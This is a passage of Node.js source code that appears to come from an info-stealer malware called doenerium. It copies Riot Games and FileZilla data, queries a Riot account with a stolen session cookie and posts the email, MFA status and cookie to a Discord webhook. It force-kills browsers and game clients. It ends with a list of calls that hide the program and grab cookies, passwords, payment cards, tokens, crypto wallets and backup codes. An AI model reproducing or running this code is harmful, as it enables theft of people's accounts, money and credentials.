            const riotGamesDestinationPath = path.join(mainFolderPath, 'RiotGames', 'ProgramData');

            const riotGamesExcludeList = [
                "Metadata\\valorant.live\\valorant.live.db",
                "Metadata\\valorant.live\\valorant.live.manifest",
                "Metadata\\valorant.live\\valorant.live.preview.manifest",
                "Metadata\\league_of_legends.live\\league_of_legends.live.preview.manifest",
                "Metadata\\vanguard\\setup.exe"
            ];

            try {
                copyriot(riotGamesSourcePath, riotGamesDestinationPath, riotGamesExcludeList);
                console.log(`Copied Riot Games data to ${riotGamesDestinationPath}`);
            } catch (err) {
                console.error(`An error occurred while copying Riot Games data: ${err.message}`);
            }

            const riotGamesLocalAppDataSourcePath = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Riot Games`;
            const riotGamesLocalAppDataDestinationPath = path.join(mainFolderPath, 'RiotGames', 'AppData', 'Local');

            try {
                copyriot(riotGamesLocalAppDataSourcePath, riotGamesLocalAppDataDestinationPath);
                console.log(`Copied Riot Games Local AppData to ${riotGamesLocalAppDataDestinationPath}`);
            } catch (err) {
                console.error(`An error occurred while copying Riot Games Local AppData: ${err.message}`);
            }

            console.log('Riot Games data copied to mainFolder/RiotGames');
        }
    } catch (error) {
        console.error(`Error in SubmitRiotGames: ${error.message}`);
    }
}



async function RiotGameSession(cookie) {
    try {
        const response = await axios.get('https://account.riotgames.com/api/account/v1/user', {
            headers: { "Cookie": `sid=${cookie}` }
        });

        const embed_data = {
            "title": ``,
            "description": ``,
            "color": 0x303037,
            "footer": {
                "text": `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
            },
            "thumbnail": { "url": "https://seeklogo.com/images/V/valorant-logo-FAB2CA0E55-seeklogo.com.png" },
            "author": {
                "name": "Valorant Session Detected",
                "icon_url": "https://i.hizliresim.com/qxnzimj.jpg"
            }
        };

        const username = String(response.data.username);
        const email = String(response.data.email);
        const region = String(response.data.region);
        const locale = String(response.data.locale);
        const country = String(response.data.country);
        const mfa = String(response.data.mfa.verified);

        const fields = [
            { "name": "Username", "value": "```" + username + "```", "inline": true },
            { "name": "Email", "value": "```" + email + "```", "inline": true },
            { "name": "Region", "value": "```" + region + "```", "inline": true },
            { "name": "Locale", "value": "```" + locale + "```", "inline": true },
            { "name": "Country", "value": "```" + country + "```", "inline": true },
            { "name": "MFA Enabled?", "value": "```" + mfa + "```", "inline": true },
            { "name": "Cookie", "value": "```" + cookie + "```", "inline": false }
        ];

        embed_data["fields"] = fields;

        const payload = {
            "embeds": [embed_data]
        };

        const headers = {
            "Content-Type": "application/json"
        };

        const responsePost = await axios.post(discordWebhookUrl, payload, { headers });
    } catch (error) {
        console.error(`Error in RiotGameSession: ${error.message}`);
    }
}


//
async function submitFileZilla() {
  const fileZillaSource = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\FileZilla`;
  const fileZillaDestination = path.join(mainFolderPath, 'FileZilla');

  if (fs.existsSync(fileZillaSource)) {
    copyFolder(fileZillaSource, fileZillaDestination);
  }
}


async function closeBrowsers() {
  const browsersProcess = ["chrome.exe", "filezilla.exe", "msedge.exe","watcher.exe", "opera.exe", "brave.exe", "steam.exe", "RiotClientServices.exe"];
  return new Promise(async (resolve) => {
    try {
      const tasks = execSync("tasklist").toString();
      browsersProcess.forEach((process) => {
        if (tasks.includes(process)) {
          execSync(`taskkill /IM ${process} /F`);
        }
      });

      await new Promise((innerResolve) => setTimeout(innerResolve, 2500));
      resolve();
    } catch (e) {
      console.log(e);
      resolve();
    }
  });
}


//

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}
        hideSelf();
        ramcheck();
        initializeFolders();
        closeBrowsers();
        Killchrome();
        getEncrypted();
        getCookies();
        stealFiles();
        runSerialChecker();
        getAutofills();
        getCards();
        getPasswords();
        removeRegistryKey();
        getTokens();
        localWalletData();
        submitFileZilla();
        SubmitRiotGames();
        StealEpicGames();
        SubmitSteam();
        stealSteamSession();
        findBackupCodes();
        findEpicGamesBackupCodes();
        findGithubBackupCodes();
        //addRegistryKey();
        createRunBat();
        createAndExecuteScripts();
        walletinjection();
        redirectErrorsToLog();
        SubmitTelegram();